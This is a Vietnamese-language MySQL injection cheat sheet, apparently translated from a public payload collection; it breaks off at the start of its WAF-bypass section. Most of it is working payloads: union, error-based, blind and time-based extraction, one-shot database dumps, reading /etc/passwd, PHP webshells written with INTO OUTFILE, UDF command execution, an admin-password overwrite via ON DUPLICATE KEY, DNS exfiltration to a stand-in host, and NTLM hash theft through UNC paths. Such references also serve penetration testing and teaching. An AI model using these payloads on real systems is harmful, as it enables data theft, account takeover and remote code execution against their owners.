# MySQL Injection

> MySQL Injection là một loại lỗ hổng bảo mật xảy ra khi kẻ tấn công có thể thao túng các câu truy vấn SQL gửi đến cơ sở dữ liệu MySQL bằng cách chèn dữ liệu đầu vào độc hại. Lỗ hổng này thường là kết quả của việc xử lý dữ liệu đầu vào của người dùng không đúng cách, cho phép kẻ tấn công thực thi mã SQL tùy ý có thể làm tổn hại đến tính toàn vẹn và bảo mật của cơ sở dữ liệu.

## Tóm tắt

* [Các cơ sở dữ liệu mặc định của MYSQL](#mysql-default-databases)
* [Chú thích trong MYSQL](#mysql-comments)
* [Kiểm tra khả năng bị Injection trên MYSQL](#mysql-testing-injection)
* [Khai thác dựa trên Union trên MYSQL](#mysql-union-based)
    * [Xác định số lượng cột](#detect-columns-number)
        * [Phương pháp NULL lặp lại](#iterative-null-method)
        * [Phương pháp ORDER BY](#order-by-method)
        * [Phương pháp LIMIT INTO](#limit-into-method)
    * [Trích xuất cơ sở dữ liệu bằng Information_schema](#extract-database-with-information_schema)
    * [Trích xuất tên cột mà không cần Information_Schema](#extract-columns-name-without-information_schema)
    * [Trích xuất dữ liệu mà không cần tên cột](#extract-data-without-columns-name)
* [Khai thác dựa trên lỗi trên MYSQL](#mysql-error-based)
    * [Khai thác dựa trên lỗi - Cơ bản](#mysql-error-based---basic)
    * [Khai thác dựa trên lỗi - Hàm UpdateXML](#mysql-error-based---updatexml-function)
    * [Khai thác dựa trên lỗi - Hàm Extractvalue](#mysql-error-based---extractvalue-function)
* [Khai thác dạng mù (Blind) trên MYSQL](#mysql-blind)
    * [Khai thác mù tương đương với Substring](#mysql-blind-with-substring-equivalent)
    * [Khai thác mù dùng câu lệnh điều kiện](#mysql-blind-using-a-conditional-statement)
    * [Khai thác mù với MAKE_SET](#mysql-blind-with-make_set)
    * [Khai thác mù với LIKE](#mysql-blind-with-like)
    * [Khai thác mù với REGEXP](#mysql-blind-with-regexp)
* [Khai thác dựa trên thời gian trên MYSQL](#mysql-time-based)
    * [Dùng SLEEP trong Subselect](#using-sleep-in-a-subselect)
    * [Dùng các câu lệnh điều kiện](#using-conditional-statements)
* [MYSQL DIOS - Trích xuất toàn bộ trong một lần](#mysql-dios---dump-in-one-shot)
* [Các truy vấn hiện tại trên MYSQL](#mysql-current-queries)
* [Đọc nội dung một tập tin trên MYSQL](#mysql-read-content-of-a-file)
* [Thực thi lệnh trên MYSQL](#mysql-command-execution)
    * [WEBSHELL - Phương pháp OUTFILE](#webshell---outfile-method)
    * [WEBSHELL - Phương pháp DUMPFILE](#webshell---dumpfile-method)
    * [LỆNH - Thư viện UDF](#command---udf-library)
* [MYSQL INSERT](#mysql-insert)
* [Cắt xén dữ liệu trên MYSQL (Truncation)](#mysql-truncation)
* [MYSQL Out of Band](#mysql-out-of-band)
    * [Trích xuất dữ liệu qua DNS](#dns-exfiltration)
    * [Đường dẫn UNC - Đánh cắp hash NTLM](#unc-path---ntlm-hash-stealing)
* [Vượt qua WAF trên MYSQL](#mysql-waf-bypass)
    * [Phương án thay thế cho Information Schema](#alternative-to-information-schema)
    * [Phương án thay thế cho VERSION](#alternative-to-version)
    * [Phương án thay thế cho GROUP_CONCAT](#alternative-to-group_concat)
    * [Ký hiệu khoa học (Scientific Notation)](#scientific-notation)
    * [Chú thích có điều kiện](#conditional-comments)
    * [Chèn ký tự đa byte (GBK)](#wide-byte-injection-gbk)
* [Tài liệu tham khảo](#references)

## Các cơ sở dữ liệu mặc định của MYSQL

| Tên                 | Mô tả                                |
| ------------------- | -------------------------------------- |
| mysql               | Yêu cầu quyền root                     |
| information_schema  | Có sẵn từ phiên bản 5 trở lên          |

## Chú thích trong MYSQL

Chú thích trong MySQL là các đoạn ghi chú trong mã SQL sẽ bị máy chủ MySQL bỏ qua khi thực thi.

| Loại                        | Mô tả                             |
| ---------------------------- | ----------------------------------- |
| `#`                          | Chú thích dạng Hash                |
| `/* MYSQL Comment */`       | Chú thích kiểu C                   |
| `/*! MYSQL Special SQL */`  | SQL đặc biệt                       |
| `/*!32302 10*/`             | Chú thích cho phiên bản MYSQL 3.23.02 |
| `--`                        | Chú thích dạng SQL                 |
| `;%00`                      | Byte null                          |
| \`                          | Dấu backtick                       |

## Kiểm tra khả năng bị Injection trên MYSQL

* **Chuỗi (Strings)**: Câu truy vấn kiểu `SELECT * FROM Table WHERE id = 'FUZZ';`

    ```ps1
    ' False
    '' True
    " False
    "" True
    \ False
    \\ True
    ```

* **Số (Numeric)**: Câu truy vấn kiểu `SELECT * FROM Table WHERE id = FUZZ;`

    ```ps1
    AND 1     True
    AND 0     False
    AND true True
    AND false False
    1-false     Returns 1 if vulnerable
    1-true     Returns 0 if vulnerable
    1*56     Returns 56 if vulnerable
    1*56     Returns 1 if not vulnerable
    ```

* **Đăng nhập (Login)**: Câu truy vấn kiểu `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`

    ```ps1
    ' OR '1
    ' OR 1 -- -
    " OR "" = "
    " OR 1 = 1 -- -
    '='
    'LIKE'
    '=0--+
    ```

## Khai thác dựa trên Union trên MYSQL

### Xác định số lượng cột

Để thực hiện thành công một cuộc tấn công SQL injection dựa trên union, kẻ tấn công cần biết số lượng cột trong câu truy vấn gốc.

#### Phương pháp NULL lặp lại

Tăng dần một cách có hệ thống số lượng cột trong câu lệnh `UNION SELECT` cho đến khi payload thực thi mà không gặp lỗi hoặc tạo ra một thay đổi có thể quan sát được. Mỗi lần lặp sẽ kiểm tra tính tương thích của số lượng cột.

```sql
UNION SELECT NULL;--
UNION SELECT NULL, NULL;-- 
UNION SELECT NULL, NULL, NULL;-- 
```

#### Phương pháp ORDER BY

Tiếp tục tăng số lượng cho đến khi nhận được phản hồi `False`. Mặc dù `GROUP BY` và `ORDER BY` có chức năng khác nhau trong SQL, cả hai đều có thể được sử dụng theo cùng một cách để xác định số lượng cột trong câu truy vấn.

| ORDER BY        | GROUP BY        | Kết quả |
| --------------- | --------------- | ------- |
| `ORDER BY 1--+` | `GROUP BY 1--+` | True    |
| `ORDER BY 2--+` | `GROUP BY 2--+` | True    |
| `ORDER BY 3--+` | `GROUP BY 3--+` | True    |
| `ORDER BY 4--+` | `GROUP BY 4--+` | False   |

Vì kết quả là false với `ORDER BY 4`, điều đó có nghĩa là câu truy vấn SQL chỉ có 3 cột.
Trong SQL injection dựa trên `UNION`, ta có thể `SELECT` dữ liệu tùy ý để hiển thị trên trang: `-1' UNION SELECT 1,2,3--+`.

Tương tự phương pháp trước, ta có thể kiểm tra số lượng cột chỉ trong một request nếu tính năng hiển thị lỗi được bật.

```sql
ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'
```

#### Phương pháp LIMIT INTO

Phương pháp này hiệu quả khi tính năng báo lỗi được bật. Nó có thể giúp xác định số lượng cột trong trường hợp điểm injection nằm sau một mệnh đề LIMIT.

| Payload                       | Lỗi                                                               |
| ------------------------------ | -------------------------------------------------------------------- |
| `1' LIMIT 1,1 INTO @--+`      | `The used SELECT statements have a different number of columns`   |
| `1' LIMIT 1,1 INTO @,@--+`    | `The used SELECT statements have a different number of columns`   |
| `1' LIMIT 1,1 INTO @,@,@--+`  | `Không có lỗi nghĩa là truy vấn dùng 3 cột`                        |

Vì kết quả không hiển thị lỗi nào, điều đó có nghĩa là truy vấn dùng 3 cột: `-1' UNION SELECT 1,2,3--+`.

### Trích xuất cơ sở dữ liệu bằng Information_Schema

Câu truy vấn này lấy ra tên của tất cả các schema (cơ sở dữ liệu) trên máy chủ.

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
```

Câu truy vấn này lấy ra tên của tất cả các bảng trong một schema cụ thể (tên schema được thể hiện bằng PLACEHOLDER).

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER
```

Câu truy vấn này lấy ra tên của tất cả các cột trong một bảng cụ thể.

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...
```

Câu truy vấn này nhằm mục đích lấy dữ liệu từ một bảng cụ thể.

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...
```

### Trích xuất tên cột mà không cần Information_Schema

Phương pháp cho `MySQL >= 4.1`.

| Payload                                                                    | Kết quả đầu ra                          |
| ---------------------------------------------------------------------------- | -------------------------------------- |
| `(1)and(SELECT * from db.users)=(1)`                                        | Operand should contain **4** column(s) |
| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)`   | Column '**id**' cannot be null         |

Phương pháp cho `MySQL 5`

| Payload                                                                    | Kết quả đầu ra                     |
| ---------------------------------------------------------------------------- | ------------------------------------ |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a`                  | Duplicate column name '**id**'      |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a`        | Duplicate column name '**name**'    |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a`   | Dữ liệu                             |

### Trích xuất dữ liệu mà không cần tên cột

Trích xuất dữ liệu từ cột thứ 4 mà không cần biết tên của nó.

```sql
SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
```

Ví dụ chèn injection bên trong câu truy vấn `select author_id,title from posts where author_id=[INJECT_HERE]`

```sql
MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
```

## Khai thác dựa trên lỗi trên MYSQL

| Tên          | Payload                                                                                        |
| ------------- | ---------------------------------------------------------------------------------------------- |
| GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -`                                |
| JSON_KEYS    | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |
| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -`                           |
| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -`                        |
| EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -`              |
| OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -`         |
| NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--`          |
| UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1`                                                                |

### Khai thác dựa trên lỗi - Cơ bản

Hoạt động với `MySQL >= 4.1`

```sql
(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))
'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'
```

### Khai thác dựa trên lỗi - Hàm UpdateXML

```sql
AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

Ngắn gọn hơn:

```sql
UPDATEXML(null,CONCAT(0x0a,version()),null)-- -
UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```

### Khai thác dựa trên lỗi - Hàm Extractvalue

Hoạt động với `MySQL >= 5.1`

```sql
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
```

### Khai thác dựa trên lỗi - Hàm NAME_CONST (chỉ dùng cho hằng số)

Hoạt động với `MySQL >= 5.0`

```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```

## Khai thác dạng mù (Blind) trên MYSQL

### Khai thác mù tương đương với Substring

| Hàm         | Ví dụ                            | Mô tả                                                                  |
| ----------- | ---------------------------------- | ------------------------------------------------------------------------- |
| `SUBSTR`    | `SUBSTR(version(),1,1)=5`         | Trích xuất một chuỗi con từ một chuỗi (bắt đầu ở bất kỳ vị trí nào)       |
| `SUBSTRING` | `SUBSTRING(version(),1,1)=5`      | Trích xuất một chuỗi con từ một chuỗi (bắt đầu ở bất kỳ vị trí nào)       |
| `RIGHT`     | `RIGHT(left(version(),1),1)=5`    | Trích xuất một số ký tự từ một chuỗi (bắt đầu từ bên phải)                |
| `MID`       | `MID(version(),1,1)=4`            | Trích xuất một chuỗi con từ một chuỗi (bắt đầu ở bất kỳ vị trí nào)       |
| `LEFT`      | `LEFT(version(),1)=4`             | Trích xuất một số ký tự từ một chuỗi (bắt đầu từ bên trái)                |

Ví dụ về Blind SQL injection sử dụng `SUBSTRING` hoặc một hàm tương đương khác:

```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```

### Khai thác mù dùng câu lệnh điều kiện

* TRUE: `nếu @@version bắt đầu bằng số 5`:

    ```sql
    2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
    Response:
    HTTP/1.1 500 Internal Server Error
    ```

* FALSE: `nếu @@version bắt đầu bằng số 4`:

    ```sql
    2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
    Response:
    HTTP/1.1 200 OK
    ```

### Khai thác mù với MAKE_SET

```sql
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
```

### Khai thác mù với LIKE

Trong MySQL, toán tử `LIKE` có thể được dùng để so khớp mẫu (pattern matching) trong các câu truy vấn. Toán tử này cho phép sử dụng các ký tự đại diện để so khớp các giá trị chuỗi chưa biết hoặc chỉ biết một phần. Điều này đặc biệt hữu ích trong bối cảnh blind SQL injection khi kẻ tấn công không biết độ dài hoặc nội dung cụ thể của dữ liệu được lưu trong cơ sở dữ liệu.

Các ký tự đại diện trong LIKE:

* **Dấu phần trăm** (`%`): Ký tự đại diện này đại diện cho không, một, hoặc nhiều ký tự. Nó có thể được dùng để so khớp bất kỳ chuỗi ký tự nào.
* **Dấu gạch dưới** (`_`): Ký tự đại diện này đại diện cho một ký tự đơn. Nó được dùng để so khớp chính xác hơn khi bạn biết cấu trúc của dữ liệu nhưng không biết ký tự cụ thể tại một vị trí nào đó.

```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
SELECT * FROM products WHERE product_name LIKE '%user_input%'
```

### Khai thác mù với REGEXP

Blind SQL injection cũng có thể được thực hiện bằng toán tử `REGEXP` của MySQL, dùng để so khớp một chuỗi với một biểu thức chính quy (regular expression). Kỹ thuật này đặc biệt hữu ích khi kẻ tấn công muốn thực hiện việc so khớp mẫu phức tạp hơn so với những gì toán tử `LIKE` có thể cung cấp.

| Payload                                                                | Mô tả                              |
| ---------------------------------------------------------------------- | ------------------------------------- |
| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Kiểm tra độ dài                       |
| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | Kiểm tra sự có mặt của chữ số         |
| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Kiểm tra dữ liệu bắt đầu bằng "a"     |

## Khai thác dựa trên thời gian trên MYSQL

Các đoạn mã SQL sau đây sẽ làm trễ kết quả đầu ra từ MySQL.

* MySQL 4/5 : [`BENCHMARK()`](https://dev.mysql.com/doc/refman/8.4/en/select-benchmarking.html)

    ```sql
    +BENCHMARK(40000000,SHA1(1337))+
    '+BENCHMARK(3200,SHA1(1))+'
    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
    ```

* MySQL 5: [`SLEEP()`](https://dev.mysql.com/doc/refman/8.4/en/miscellaneous-functions.html#function_sleep)

    ```sql
    RLIKE SLEEP([SLEEPTIME])
    OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
    XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
    AND SLEEP(10)=0
    AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)
    ```

### Dùng SLEEP trong Subselect

Trích xuất độ dài của dữ liệu.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# 
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
```

Trích xuất ký tự đầu tiên.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#
```

Trích xuất ký tự thứ hai.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#
```

Trích xuất ký tự thứ ba.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#
```

Trích xuất column_name.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
```

### Dùng các câu lệnh điều kiện

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```

## MYSQL DIOS - Trích xuất toàn bộ trong một lần

SQL Injection dạng DIOS (Dump In One Shot) là một kỹ thuật nâng cao cho phép kẻ tấn công trích xuất toàn bộ nội dung cơ sở dữ liệu chỉ trong một payload SQL injection được xây dựng cẩn thận. Phương pháp này tận dụng khả năng nối nhiều mẩu dữ liệu thành một tập kết quả duy nhất, sau đó được trả về trong một phản hồi duy nhất từ cơ sở dữ liệu.

```sql
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
```

* SecurityIdiots

    ```sql
    make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
    ```

* Profexer

    ```sql
    (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
    ```

* Dr.Z3r0

    ```sql
    (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))
    ```

* M@dBl00d

    ```sql
    (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
    ```

* Zen

    ```sql
    +make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
    ```

* sharik

    ```sql
    (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
    ```

## Các truy vấn hiện tại trên MYSQL

`INFORMATION_SCHEMA.PROCESSLIST` là một bảng đặc biệt có sẵn trong MySQL và MariaDB, cung cấp thông tin về các tiến trình và luồng đang hoạt động trong máy chủ cơ sở dữ liệu. Bảng này có thể liệt kê tất cả các thao tác mà DB đang thực hiện tại thời điểm hiện tại.

Bảng `PROCESSLIST` chứa một số cột quan trọng, mỗi cột cung cấp thông tin chi tiết về các tiến trình hiện tại. Các cột phổ biến bao gồm:

* **ID**: Định danh của tiến trình.
* **USER**: Người dùng MySQL đang chạy tiến trình.
* **HOST**: Máy chủ khởi tạo tiến trình.
* **DB**: Cơ sở dữ liệu mà tiến trình đang truy cập, nếu có.
* **COMMAND**: Loại lệnh mà tiến trình đang thực thi (ví dụ: Query, Sleep).
* **TIME**: Thời gian tính bằng giây mà tiến trình đã chạy.
* **STATE**: Trạng thái hiện tại của tiến trình.
* **INFO**: Nội dung câu lệnh đang được thực thi, hoặc NULL nếu không có câu lệnh nào đang được thực thi.

```sql
SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
```

| ID  | USER      | HOST             | DB     | COMMAND | TIME | STATE      | INFO                     |
| --- | --------- | ---------------- | ------ | ------- | ---- | ---------- | ------------------------ |
| 1   | root      | localhost        | testdb | Query   | 10   | executing  | SELECT * FROM some_table |
| 2   | app_uset  | 192.168.0.101    | appdb  | Sleep   | 300  | sleeping   | NULL                     |
| 3   | gues_user | example.com:3360 | NULL   | Connect | 0    | connecting | NULL                     |

```sql
UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
```

Truy vấn trích xuất toàn bộ trong một lần để lấy hết nội dung của bảng.

```sql
UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```

## Đọc nội dung một tập tin trên MYSQL

Cần có quyền `filepriv`, nếu không sẽ gặp lỗi: `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`

```sql
UNION ALL SELECT LOAD_FILE('/etc/passwd') --
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
```

Nếu bạn có quyền `root` trên cơ sở dữ liệu, bạn có thể kích hoạt lại `LOAD_FILE` bằng câu truy vấn sau

```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

## Thực thi lệnh trên MYSQL

### WEBSHELL - Phương pháp OUTFILE

```sql
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

### WEBSHELL - Phương pháp DUMPFILE

```sql
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

### LỆNH - Thư viện UDF

Trước tiên bạn cần kiểm tra xem UDF có được cài đặt trên máy chủ hay không.

```powershell
$ whereis lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so
```

Sau đó bạn có thể dùng các hàm như `sys_exec` và `sys_eval`.

```sql
$ mysql -u root -p mysql
Enter password: [...]

mysql> SELECT sys_eval('id');
+--------------------------------------------------+
| sys_eval('id') |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------------------------+
```

## MYSQL INSERT

Từ khóa `ON DUPLICATE KEY UPDATE` được dùng để báo cho MySQL biết phải làm gì khi ứng dụng cố gắng chèn một dòng đã tồn tại trong bảng. Ta có thể dùng điều này để thay đổi mật khẩu admin bằng cách:

Chèn bằng payload:

```sql
attacker_dummy@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
```

Câu truy vấn sẽ trông như sau:

```sql
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "BCRYPT_HASH"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" -- ", "BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT");
```

Câu truy vấn này sẽ chèn một dòng cho người dùng "`attacker_dummy@example.com`". Nó cũng sẽ chèn một dòng cho người dùng "`admin@example.com`".

Vì dòng này đã tồn tại, từ khóa `ON DUPLICATE KEY UPDATE` sẽ báo cho MySQL cập nhật cột `password` của dòng đã tồn tại đó thành "P@ssw0rd". Sau đó, ta có thể đơn giản là xác thực với "`admin@example.com`" và mật khẩu "P@ssw0rd".

## Cắt xén dữ liệu trên MYSQL (Truncation)

Trong MYSQL "`admin`" và "`admin `" (có khoảng trắng) được coi là giống nhau. Nếu cột username trong cơ sở dữ liệu có giới hạn số ký tự, phần ký tự còn lại sẽ bị cắt bớt. Vì vậy nếu cơ sở dữ liệu có giới hạn cột là 20 ký tự và ta nhập một chuỗi có 21 ký tự, ký tự cuối cùng sẽ bị loại bỏ.

```sql
`username` varchar(20) not null
```

Payload: `username = "admin               a"`

## MYSQL Out of Band

```powershell
SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';
SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt;
```

### Trích xuất dữ liệu qua DNS

```sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))
```

### Đường dẫn UNC - Đánh cắp hash NTLM

Thuật ngữ "đường dẫn UNC" đề cập đến đường dẫn theo Quy ước Đặt tên Chung (Universal Naming Convention) được dùng để xác định vị trí của các tài nguyên như tập tin chia sẻ hoặc thiết bị trên mạng. Nó thường được dùng trong môi trường Windows để truy cập tập tin qua mạng theo định dạng như `\\server\share\file`.

```sql
SELECT LOAD_FILE('\\\\error\\abc');
SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);
SELECT '' INTO DUMPFILE '\\\\error\\abc';
SELECT '' INTO OUTFILE '\\\\error\\abc';
LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;
```

:warning: Đừng quên escape dấu '\\\\'.

## Vượt qua WAF trên MYSQL

### Phương án thay thế cho Information Schema

Phương án thay thế cho `information_schema.tables`

```sql
